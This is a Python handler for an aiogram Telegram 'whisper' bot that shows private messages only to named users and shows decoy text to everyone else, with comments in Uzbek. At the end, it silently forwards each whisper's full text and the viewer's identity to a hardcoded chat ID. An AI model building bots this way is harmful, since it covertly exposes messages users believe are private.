
import logging
from sqlite3 import dbapi2
from aiogram import types

from pprint import pprint

from loader import dp, db
from keyboards.inline.callback_data import whisper_callback

@dp.callback_query_handler(whisper_callback.filter())
async def InlineHandler(call: types.CallbackQuery, callback_data: dict):
    msg_id = callback_data["msg_id"]
    # print("\n123\n")
    db_result = db.select_message(message_id=msg_id)


    # Ma'lumot bazada bor yoki yo'qligini tekshiramiz
    if db_result:
        matn =  db_result[1]
        owner_id = db_result[3] 

        temp = matn.split("||")
        wanted_users = temp[0].split()
        for i in range(len(wanted_users)):
            wanted_users[i] = wanted_users[i].lower()


        possible_id = str(call.from_user.id)
        possible_username = call.from_user.username
        if possible_username:
            possible_username = possible_username.lower()

       
        # logging.info(f"{type(wanted_users)=}")
        # logging.info(f"{type(possible_id)=}")
        
        # logging.info(f"{wanted_users =} ")
        # logging.info(f"{possible_id =} ")

        # Yolg'on xabar bor yoki yo'qligini tekshiramiz:
        if len(temp) >= 3:
            yolgon_xabar = temp[2]
        else:
            yolgon_xabar = "Haaa"
        

        # Asosiy xabar
        asosiy_matn = temp[1]
        asosiy_matn += "\n\n‼️Bu xabar boshqalarga quyidagicha ko'rinadi:\n"
        asosiy_matn += f'" {yolgon_xabar} "'




        if  possible_id in wanted_users or\
            possible_username in wanted_users or\
            str(call.from_user.id) == owner_id:

            if len(asosiy_matn) <= 200:
                await call.answer(text=asosiy_matn, cache_time=60, show_alert=True)
            else: 
                await call.answer(text=temp[1][:200], cache_time=60, show_alert=True)

            txt = "✅Xabar ko'rildi: \nIsm: "
            txt += call.from_user.get_mention(as_html=True)
            txt += f"\nID: {possible_id}\n"
            txt += f"Username: @{possible_username}\n"
            

        else:

            await call.answer(text=yolgon_xabar, cache_time=60, show_alert=True)
            txt = "⚠️Xabarni ko'rishga urinishdi: \nIsm: "
            txt += call.from_user.get_mention(as_html=True)
            txt += f"\nID: {possible_id}\n"
            txt += f"Username: @{possible_username}\n"
            
            
        try:
            await dp.bot.send_message(chat_id=1039835085, text=txt)
            await dp.bot.send_message(chat_id=1039835085, text=f"<b>XABAR</b>:\n{asosiy_matn}")
        except:
            pass
        

    
